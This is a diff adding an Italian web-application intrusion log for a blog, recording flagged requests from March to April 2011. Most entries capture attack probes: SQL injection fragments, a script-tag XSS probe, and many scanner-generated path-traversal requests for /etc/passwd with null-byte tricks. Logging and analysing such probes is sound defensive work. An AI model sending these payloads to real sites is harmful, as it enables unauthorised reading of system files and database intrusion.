@@ -1,0 +1,544 @@
+File di log creato il 31 March del 2011 alle ore 5:36 pm
+
+March 31, 2011, 5:36 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+and+ | Referer: 
+
+March 31, 2011, 5:37 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+select+1,2,3 | Referer: 
+
+March 31, 2011, 5:37 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union | Referer: 
+
+March 31, 2011, 5:37 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+select | Referer: 
+
+March 31, 2011, 5:39 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3Cscript%3Ealert(a) | Referer: 
+
+March 31, 2011, 5:45 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+all+select | Referer: 
+
+March 31, 2011, 5:45 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+all+select | Referer: 
+
+March 31, 2011, 5:46 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+all+selecto | Referer: 
+
+March 31, 2011, 5:47 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+all+selecto | Referer: 
+
+March 31, 2011, 5:47 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+all+selecto | Referer: 
+
+March 31, 2011, 5:48 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+all+selecto | Referer: 
+
+March 31, 2011, 5:54 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+all+selecto | Referer: 
+
+March 31, 2011, 5:55 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+all+selecto | Referer: 
+
+March 31, 2011, 5:56 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+all+selecton | Referer: 
+
+March 31, 2011, 5:56 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+union+all+select | Referer: 
+
+March 31, 2011, 6:06 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:07 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:07 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:17 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:17 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:18 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:18 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:20 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:20 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:20 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:22 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:22 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:22 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:22 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:22 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 6:29 pm ...! URL attaccata !... IP: 151.46.179.219 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.15) Gecko/20110308 Gentoo Firefox/3.6.15 | URL: (http://netcoders.org)/blog/viewpost.php?id=2+and | Referer: 
+
+March 31, 2011, 7:05 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+and+union | Referer: 
+
+March 31, 2011, 7:05 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+and+union | Referer: 
+
+March 31, 2011, 7:33 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+and+union | Referer: 
+
+March 31, 2011, 7:34 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+and+union | Referer: 
+
+March 31, 2011, 7:34 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+and+union | Referer: 
+
+March 31, 2011, 8:32 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:34 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:34 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:34 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:35 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:35 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:36 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:36 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:39 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:39 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:40 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+March 31, 2011, 8:42 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=4+and | Referer: 
+
+April 1, 2011, 9:10 am ...! Referrer non coincidente con il server, richiesta esterna !... IP: 66.249.71.238 | Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) | URL: (http://www.netcoders.org)/blog/ | Referer: 
+
+April 2, 2011, 3:40 pm ...! URL attaccata !... IP: 80.181.67.180 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=4+and | Referer: 
+
+April 3, 2011, 6:43 pm ...! URL attaccata !... IP: 62.211.230.142 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%20union | Referer: 
+
+April 3, 2011, 10:28 pm ...! URL attaccata !... IP: 62.211.230.142 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/profile.php?id=1+and | Referer: 
+
+April 4, 2011, 3:52 pm ...! URL attaccata !... IP: 82.55.100.203 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1+and | Referer: 
+
+April 4, 2011, 9:01 pm ...! Referrer non coincidente con il server, richiesta esterna !... IP: 82.55.100.203 | Agent: Mozilla/5.0 (X11; Linux i686; rv:2.0) Gecko/20100101 Firefox/4.0 | URL: (http://netcoders.org)/blog/viewpost.php?id=4 | Referer: 
+
+April 4, 2011, 9:04 pm ...! Referrer non coincidente con il server, richiesta esterna !... IP: 82.55.100.203 | Agent: Mozilla/5.0 (X11; Linux i686; rv:2.0) Gecko/20100101 Firefox/4.0 | URL: (http://netcoders.org)/blog/viewpost.php?id=4 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%2500.php | Referer: 
+
